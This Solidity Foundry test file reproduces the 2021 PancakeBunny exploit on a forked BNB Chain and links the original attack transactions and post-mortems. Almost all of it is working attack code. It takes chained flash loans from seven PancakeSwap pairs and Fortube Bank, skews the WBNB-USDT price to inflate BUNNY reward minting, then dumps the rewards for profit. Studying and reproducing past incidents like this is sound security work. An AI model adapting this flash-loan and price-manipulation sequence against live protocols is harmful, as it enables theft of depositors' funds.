// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

/**
 * Exploit:
 * Tx 1 : https://bscscan.com/tx/0x88fcffc3256faac76cde4bbd0df6ea3603b1438a5a0409b2e2b91e7c2ba3371a
 *     Attacker zaps 1 BNB into WBNB-USDT VaultFlipToFlip
 *
 * harvest() tx: https://dashboard.tenderly.co/tx/bsc/0x9c48fd13d65f5f951882282444a45a7b84c4f673891bbdcc48af68ed305950bb/debugger?trace=0.0
 *
 * Tx 2 : https://bscscan.com/tx/0x897c2de73dd55d7701e1b69ffb3a17b0f4801ced88b0c75fe1551c5fcce6a979
 *     Attacker's price oracle manipulation transaction
 *
 * Resources:
 * https://pancakebunny.medium.com/hello-bunny-fam-a7bf0c7a07ba
 * https://cmichel.io/bsc-pancake-bunny-exploit-post-mortem/
 * https://rekt.news/pancakebunny-rekt/
 * https://www.newsbtc.com/news/company/bsc-flash-loan-attack-pancakebunny/
 */

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address BUNNY = 0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51;

    IVaultFlipToFlip flip = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);

    IBunnyZap zap = IBunnyZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);

    IPancakeRouter router = IPancakeRouter(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));

    Uni_Pair_V2 WBNBUSDTv1 = Uni_Pair_V2(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);
    Uni_Pair_V2 WBNBUSDTv2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 WBNBBUNNY = Uni_Pair_V2(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);

    Uni_Pair_V2 WBNBCAKE = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Pair_V2 WBNBBUSD = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    Uni_Pair_V2 WBNBETH = Uni_Pair_V2(0x74E4716E431f45807DCF19f284c7aA99F18a4fbc);
    Uni_Pair_V2 WBNBBTC = Uni_Pair_V2(0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082);
    Uni_Pair_V2 WBNBSAFEMOON = Uni_Pair_V2(0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0);
    Uni_Pair_V2 WBNBBELT = Uni_Pair_V2(0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb);
    Uni_Pair_V2 WBNBDOT = Uni_Pair_V2(0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF);
    Uni_Pair_V2[] pairs = [WBNBCAKE, WBNBBUSD, WBNBETH, WBNBBTC, WBNBSAFEMOON, WBNBBELT, WBNBDOT];

    IFortubeBank FortubeBank = IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);

    address keeper = 0x793074D9799DC3c6039F8056F1Ba884a73462051;

    constructor() public {
        cheat.createSelectFork("bsc", 7_556_330);

        IERC20(WBNB).approve(address(zap), 1e18);
        IERC20(address(WBNBUSDTv2)).approve(address(flip), type(uint256).max);
        IERC20(address(USDT)).approve(address(router), type(uint256).max);
        IERC20(address(WBNB)).approve(address(router), type(uint256).max);
    }

    function testExploit() public {
        payable(WBNB).call{value: 1e18}("");

        emit log_named_decimal_uint(
            "Initial WBNB balance of attacker:", IERC20(WBNB).balanceOf(address(this)), IERC20(WBNB).decimals()
        );
        emit log_named_decimal_uint(
            "Initial USDT balance of attacker:", IERC20(USDT).balanceOf(address(this)), IERC20(USDT).decimals()
        );
        emit log_named_decimal_uint(
            "Initial BUNNY balance of attacker:", IERC20(BUNNY).balanceOf(address(this)), IERC20(BUNNY).decimals()
        );

        // Deposit a minimum amount of WBNB + USDT to VaultFlipToFlip, transfer LP tokens to WBNB + USDT Pancake pool.
        emit log_string("Zapping 1 WBNB into WBNB+USDT v2 pool...");

        zap.zapInToken(WBNB, 1e18, address(WBNBUSDTv2));
        uint256 lpamount = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));
        flip.deposit(lpamount);

        emit log_string("After X blocks, the keeper of VaultFlipToFlip calls harvest()");

        cheat.warp(1_655_908_339);
        cheat.roll(7_556_391);

        // Keeper needs to call flip.harvest() so that flip.earned(address(this)) > 0
        cheat.prank(keeper);
        (bool success,) = address(flip).call(abi.encodeWithSignature("harvest()"));
        require(success, "flip.harvest() fails");

        emit log_string("Exploit begins:");

        trigger();
    }

    function trigger() public {
        if (flip.earned(address(this)) > 0) {
            //Initiate flashloans
            emit log_string("Initiate flashloans...");

            (uint256 _amount0, uint256 _amount1,) = pairs[0].getReserves();
            if (WBNB == pairs[0].token1()) {
                pairs[0].swap(0, _amount1 - 1, address(this), abi.encode(0, 1));
            } else {
                pairs[0].swap(_amount0 - 1, 0, address(this), abi.encode(0, 0));
            }

            // execution passes to pancakeCall()

            // all flashloans have been repaid!
            emit log_string("All flashloans have been repaid!");

            //Collect profit
            emit log_named_decimal_uint(
                "Collected WBNB profit:", IERC20(WBNB).balanceOf(address(this)), IERC20(WBNB).decimals()
            );
            emit log_named_decimal_uint(
                "Collected USDT profit:", IERC20(USDT).balanceOf(address(this)), IERC20(USDT).decimals()
            );
        } else {
            revert("Nothing earned.");
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        (uint256 level, uint256 asset) = abi.decode(data, (uint256, uint256));

        // Take 6 WBNB flashloans from PCS
        if (level + 1 < 7) {
            level++;
            (uint256 _amount0, uint256 _amount1,) = pairs[level].getReserves();
            if (WBNB == pairs[level].token1()) {
                pairs[level].swap(0, _amount1 - 1, address(this), abi.encode(level, 1));
            } else {
                pairs[level].swap(_amount0 - 1, 0, address(this), abi.encode(level, 0));
            }
        } else {
            //flashloan from fortube bank
            uint256 usdtFlashloanAmount = 2_961_750_450_987_026_369_366_661; // 2'961'750.450987026369366661 USDT

            FortubeBank.flashloan(address(this), USDT, usdtFlashloanAmount, hex"");
            // execution passes to executeOperation()
        }

        //repay each PCS flashloan
        uint256 retAmount = asset == 0 ? ((amount0 * 10_000) / 9975 + 1) : ((amount1 * 10_000) / 9975 + 1);
        require(IERC20(WBNB).balanceOf(address(this)) >= retAmount, "not making proift");
        IERC20(WBNB).transfer(msg.sender, retAmount);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) public {
        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));

        emit log_named_decimal_uint(
            "After all PCS flashloans, attacker WBNB balance:",
            IERC20(WBNB).balanceOf(address(this)),
            IERC20(WBNB).decimals()
        );

        emit log_named_decimal_uint(
            "After Fortube Bank flashloan, USDT balance of attacker:", usdtBalance, IERC20(USDT).decimals()
        );

        // *Actual exploit*
        exploit();

        // Start repaying flashloans
        emit log_string("Repaying flashloans...");

        // Repay fortube flashloan
        uint256 usdtOwed = amount + fee;
        IERC20(USDT).transfer(FortubeBank.controller(), usdtOwed);
    }

    function exploit() public {
        uint256 wbnbAmount = IERC20(WBNB).balanceOf(address(this)) - 15_000e18;

        // Manipulate BunnyMinter._zapAssetsToBunnyBNB - deposit liquidity
        IERC20(WBNB).approve(address(zap), type(uint256).max);
        zap.zapInToken(WBNB, 15_000e18, address(WBNBUSDTv2));
        uint256 attackerLPBalance = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));
        IERC20(address(WBNBUSDTv2)).transfer(address(WBNBUSDTv2), attackerLPBalance);

        emit log_string("Dumping all WBNB for USDT on WBNB+USDT v1 pool..");

        // Manipulate WBNB - USDT pair
        (uint256 reserve0, uint256 reserve1,) = WBNBUSDTv1.getReserves();
        uint256 amountIn = wbnbAmount;
        uint256 amountOut = router.getAmountOut(amountIn, reserve1, reserve0);
        IERC20(WBNB).transfer(address(WBNBUSDTv1), amountIn);
        WBNBUSDTv1.swap(amountOut, 0, address(this), hex"");

        emit log_named_decimal_uint(
            "After dumping all WBNB, WBNB balance of attacker:",
            IERC20(WBNB).balanceOf(address(this)),
            IERC20(WBNB).decimals()
        );
        emit log_named_decimal_uint(
            "After dumping all WBNB, USDT balance of attacker:",
            IERC20(USDT).balanceOf(address(this)),
            IERC20(USDT).decimals()
        );

        //Collect inflated rewards
        flip.getReward();

        emit log_named_decimal_uint(
            "After collecting rewards, BUNNY balance of attacker:",
            IERC20(BUNNY).balanceOf(address(this)),
            IERC20(BUNNY).decimals()
        );

        //Dump BUNNY
        emit log_string("Dumping all BUNNY for WBNB on WBNB+BUNNY pool...");
        {
            uint256 bunnyBalance = IERC20(BUNNY).balanceOf(address(this)) - 1;
            (uint256 reserve0, uint256 reserve1,) = WBNBBUNNY.getReserves();
            uint256 amountIn = bunnyBalance;
            uint256 amountOut = router.getAmountOut(bunnyBalance, reserve1, reserve0);

            IERC20(BUNNY).transfer(address(WBNBBUNNY), amountIn);
            WBNBBUNNY.swap(amountOut, 0, address(this), hex"");

            emit log_named_decimal_uint(
                "After dumping all BUNNY, WBNB balance of attacker:",
                IERC20(WBNB).balanceOf(address(this)),
                IERC20(WBNB).decimals()
            );
        }
    }
}
